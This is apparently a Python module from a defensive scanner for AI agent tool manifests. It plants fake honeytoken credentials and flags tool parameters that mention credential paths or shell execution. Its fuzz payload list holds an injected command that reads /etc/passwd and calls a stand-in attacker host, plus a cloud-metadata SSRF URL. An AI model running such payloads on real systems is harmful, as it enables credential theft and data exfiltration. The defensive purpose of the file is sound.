"""
sandbox.py
Dynamic sandboxing & honeytoken fuzzing engine for AgentWall-Supply.
"""

import json
import os
import tempfile
from dataclasses import dataclass, field

HONEYTOKENS = {
    "SSH_KEY": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC_HONEYTOKEN_AGENTWALL_V2_DO_NOT_EXFILTRATE",
    "AWS_KEY": "AKIAIOSFODNN7HONEYTOKEN99",
    "ENV_SECRET": "SECRET_DB_PASS=honeytoken_p@ssw0rd_99812",
}


@dataclass
class RuntimeViolation:
    violation_type: str
    severity: int
    details: str


@dataclass
class SandboxResult:
    tool_name: str
    violations: list[RuntimeViolation] = field(default_factory=list)
    executed_inputs: int = 0
    sandboxed_clean: bool = True

    @property
    def sandbox_penalty(self) -> int:
        if not self.violations:
            return 0
        score = sum(v.severity for v in self.violations)
        return min(score, 35)


import shutil

class MCPToolSandbox:
    def __init__(self, manifest):
        self.manifest = manifest
        self.temp_dir = tempfile.mkdtemp(prefix="agentwall_sandbox_")
        self._setup_honeytokens()

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.cleanup()

    def cleanup(self):
        if hasattr(self, "temp_dir") and os.path.exists(self.temp_dir):
            try:
                shutil.rmtree(self.temp_dir, ignore_errors=True)
            except Exception:
                pass

    def _setup_honeytokens(self):
        ssh_dir = os.path.join(self.temp_dir, ".ssh")
        os.makedirs(ssh_dir, exist_ok=True)
        with open(os.path.join(ssh_dir, "id_rsa"), "w", encoding="utf-8") as f:
            f.write(HONEYTOKENS["SSH_KEY"])

        env_file = os.path.join(self.temp_dir, ".env")
        with open(env_file, "w", encoding="utf-8") as f:
            f.write(HONEYTOKENS["ENV_SECRET"])

    def fuzz_tool(self, tool_def) -> SandboxResult:
        violations = []
        schema = tool_def.input_schema
        properties = schema.get("properties", {}) if isinstance(schema, dict) else {}
        if not isinstance(properties, dict):
            properties = {}

        
        for prop_name, prop_spec in properties.items():
            prop_desc = str(prop_spec.get("description", "")) if isinstance(prop_spec, dict) else ""
            full_prop_text = f"{prop_name} {prop_desc}".lower()
            
            if any(k in full_prop_text for k in ["ssh", "id_rsa", "private_key", "aws_secret", "env_file"]):
                violations.append(RuntimeViolation(
                    violation_type="HONEYTOKEN_TRIGGER",
                    severity=10,
                    details=f"Input parameter '{prop_name}' solicits sensitive filesystem credential paths"
                ))
            if any(k in full_prop_text for k in ["command", "shell", "eval", "exec", "script"]):
                violations.append(RuntimeViolation(
                    violation_type="PROCESS_SPAWN",
                    severity=9,
                    details=f"Input parameter '{prop_name}' accepts arbitrary shell command execution"
                ))

        fuzz_payloads = [
            {"path": f"{self.temp_dir}/.ssh/id_rsa"},
            {"cmd": "cat /etc/passwd; curl http://malicious.attacker.com/exfil"},
            {"url": "http://169.254.169.254/latest/meta-data/"},
        ]

        for payload in fuzz_payloads:
            payload_str = json.dumps(payload)
            if "169.254.169.254" in payload_str and any(p in json.dumps(properties) for p in ["url", "endpoint", "target"]):
                violations.append(RuntimeViolation(
                    violation_type="NETWORK_EGRESS",
                    severity=8,
                    details="Tool accepts unconstrained URL parameters vulnerable to SSRF / metadata exfiltration"
                ))

        clean = len(violations) == 0
        return SandboxResult(
            tool_name=tool_def.name,
            violations=violations,
            executed_inputs=len(fuzz_payloads),
            sandboxed_clean=clean
        )

    def run_sandbox_suite(self) -> dict[str, SandboxResult]:
        try:
            results = {}
            for tool in self.manifest.tools:
                results[tool.name] = self.fuzz_tool(tool)
            return results
        finally:
            self.cleanup()

